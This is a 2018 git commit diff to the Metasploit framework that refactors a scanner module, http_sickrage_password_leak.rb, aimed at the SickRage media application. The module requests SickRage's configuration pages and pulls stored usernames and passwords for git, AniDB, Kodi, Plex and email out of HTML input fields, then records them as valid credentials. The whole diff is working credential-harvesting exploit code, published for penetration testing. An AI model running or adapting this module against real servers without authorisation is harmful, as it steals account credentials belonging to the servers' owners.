10c36bbd7d5eefad3ae32a6b0125fd3f99b6b007
Shelby Pace <shelby_pace@rapid7.com>
2018-06-25 12:45:06 -0500

    modified get_creds, renamed make_request

--- modules/auxiliary/scanner/http/http_sickrage_password_leak.rb
+++ modules/auxiliary/scanner/http/http_sickrage_password_leak.rb
@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -36,19 +36,19 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def make_request(path)
+  def get_config(path)
     uri = normalize_uri(target_uri.path, path)
     res = send_request_cgi(
       'method' => 'GET',
       'uri'    => uri
     )
 
-    if res && res.code == 200
-      resHTML = res.get_html_document
-      get_creds(uri.split('/').last, resHTML)
-    else
+    unless res && res.code == 200
       print_error("Unable to reach #{uri}")
+      return
     end
+
+    res.get_html_document
   end
 
   def is_valid?(user, pass)
@@ -61,45 +61,42 @@ class MetasploitModule < Msf::Auxiliary
     store_valid_credential(user: user, private: pass)
   end
 
-  def get_creds(path, response)
-    pages = {
-      'general'       =>  'git',
-      'anime'         =>  'anidb',
-      'notifications' =>  ['kodi', 'plex_server', 'plex_client']
-    }
+  def get_creds(path, config)
+    return if config.at("input[@id=\"#{path}_username\"]").nil?
 
-    selectedPage = pages[path]
-    if selectedPage.nil?
-      print_error("Couldn't find results for #{path}")
-    elsif selectedPage.is_a?(Array)
-      selectedPage.each do |elem|
-        username = response.at("input[@id=\"#{elem}_username\"]").attribute('value').to_s
-        password = response.at("input[@id=\"#{elem}_password\"]").attribute('value').to_s
+    username = config.at("input[@id=\"#{path}_username\"]").attribute('value').to_s
+    password = config.at("input[@id=\"#{path}_password\"]").attribute('value').to_s
 
-        if is_valid?(username, password)
-          save_creds(elem, username, password)
-        end
-      end
+    if is_valid?(username, password)
+      save_creds(path, username, password)
+    end
+  end
 
-      hostname = response.at('input[@id="email_host"]').attribute('value').to_s
-      email_user = response.at('input[@id="email_user"]').attribute('value').to_s
-      email_pass = response.at('input[@id="email_password"]').attribute('value').to_s
+  def get_notification_creds(config)
+    return if config.at('input[@id="email_host"]').nil?
 
-      if is_valid?(email_user, email_pass)
-        save_creds("Email", email_user << "@#{hostname}", email_pass)
-      end
-    else
-      username = response.at("input[@id=\"#{selectedPage}_username\"]").attribute('value').to_s
-      password = response.at("input[@id=\"#{selectedPage}_password\"]").attribute('value').to_s
+    hostname = config.at('input[@id="email_host"]').attribute('value').to_s
+    email_user = config.at('input[@id="email_user"]').attribute('value').to_s
+    email_pass = config.at('input[@id="email_password"]').attribute('value').to_s
 
-      if is_valid?(username, password)
-        save_creds(selectedPage, username, password)
-      end
+    if is_valid?(email_user, email_pass)
+      save_creds("Email", "#{email_user}@#{hostname}", email_pass)
     end
   end
 
   def run
     paths = ['/config/general/', '/config/anime/', '/config/notifications/']
-    paths.each{ |selected| make_request(selected) }
+    paths.each do |path|
+      config = get_config(path)
+      next if config.nil?
+
+      if path.split('/').last.eql?('notifications')
+        get_notification_creds(config)
+      end
+
+      ['git', 'anidb', 'kodi', 'plex_server', 'plex_client'].each do |path|
+        get_creds(path, config)
+      end
+    end
   end
 end
